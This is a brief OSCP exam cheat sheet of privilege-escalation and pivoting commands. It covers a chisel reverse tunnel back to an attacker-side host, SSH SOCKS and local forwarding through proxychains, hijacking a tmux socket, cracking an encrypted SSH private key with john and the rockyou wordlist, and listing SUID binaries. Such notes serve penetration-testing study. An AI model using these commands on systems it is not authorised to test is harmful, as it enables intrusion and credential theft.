# OSCP_Cheat_sheet

## Privilege Escalation

1. Port-Forwarding or SSH Tunneling

 a. ./chisel client 10.10.14.21:8080 R:631:127.0.0.1:631 -- target machine

    ./chisel server --reverse -- host machine
    
 b. ssh user@ip -D 1080 -- forrward all traffics on localhost port 1080

    edit /etc/proxychains.conf, add SOCKS 127.0.0.1 1080 

    ssh user@ip -L xxxx.127.0.0.1:xxxx 

    proxychains <command>

 c. 

 2. Attach tmux session

  /usr/bin/tmux -S /.devs/dev_sess

 3. Decrypt id_rsa key with password

   /usr/share/john/ssh2john.py id_rsa.encrypted > id_rsa_ssh2john

   john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_ssh2john

   openssl rsa -in hype_key_encrypted -out hype_key_decrypted

 4. Finding SUID binaries

   find / -perm -4000 2>/dev/null

   
